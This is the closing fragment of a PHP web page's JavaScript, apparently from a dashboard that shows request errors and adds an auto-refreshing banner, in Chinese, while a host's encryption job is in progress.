        r.innerHTML='<span style="color:#ef4444"><i class="fas fa-times-circle"></i> '+j.msg+'</span>';
      }
    })
    .catch(function(e){r.innerHTML='<span style="color:#ef4444"><i class="fas fa-times-circle"></i> 请求失败: '+e+'</span>';});
}

// ── 加密进度自动刷新 ──
(function(){
  var active = <?= $has_active ? 'true' : 'false' ?>;
  if (!active) return;
  // 顶部提示条
  var bar=document.createElement('div');
  bar.style.cssText='position:fixed;top:0;left:0;right:0;z-index:9999;background:linear-gradient(90deg,#f59e0b,#ef4444);color:#fff;font-size:.8rem;font-weight:600;text-align:center;padding:6px 12px;box-shadow:0 2px 8px rgba(0,0,0,.4)';
  bar.innerHTML='<i class="fas fa-spinner fa-spin"></i> 有主机正在加密，进度条每 10 秒自动刷新…';
  document.body.appendChild(bar);
  setTimeout(function(){ location.reload(); }, 10000);
})();
</script>
</body>
</html>
